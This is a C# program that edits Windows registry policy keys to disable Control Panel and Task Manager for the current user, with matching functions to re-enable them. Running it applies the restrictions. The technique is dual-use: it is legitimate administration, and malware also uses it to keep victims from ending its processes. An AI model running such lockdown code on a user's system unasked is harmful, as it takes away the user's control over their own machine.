using Microsoft.Win32;\nusing System;\n\nclass GPManipulator\n{\n    public static void RestrictControlPanel()\n    {\n        // Open or create the Control Panel restriction key in the registry.\n        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))\n        {\n            if (key != null)\n            {\n                // Disable control panel\n                key.SetValue("NoControlPanel", 1);\n            }\n        }\n    }\n\n    public static void UnblockControlPanel()\n    {\n        // Open the Control Panel restriction key in the registry.\n        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))\n        {\n            if (key != null)\n            {\n                // Enable control panel\n                key.SetValue("NoControlPanel", 0);\n            }\n        }\n    }\n\n    public static void RestrictTaskManager()\n    {\n        // Open or create the Task Manager restriction key in the registry.\n        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))\n        {\n            if (key != null)\n            {\n                // Disable task manager\n                key.SetValue("DisableTaskMgr", 1);\n            }\n        }\n    }\n\n    public static void UnblockTaskManager()\n    {\n        // Open the Task Manager restriction key in the registry.\n        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))\n        {\n            if (key != null)\n            {\n                // Enable task manager\n                key.SetValue("DisableTaskMgr", 0);\n            }\n        }\n    }\n\n    static void Main(string[] args)\n    {\n        RestrictControlPanel();\n        RestrictTaskManager();\n\n        Console.WriteLine("Control Panel and Task Manager have been restricted.");\n        \n        // Uncomment the following lines to unblock them:\n        // UnblockControlPanel();\n        // UnblockTaskManager();\n    }\n}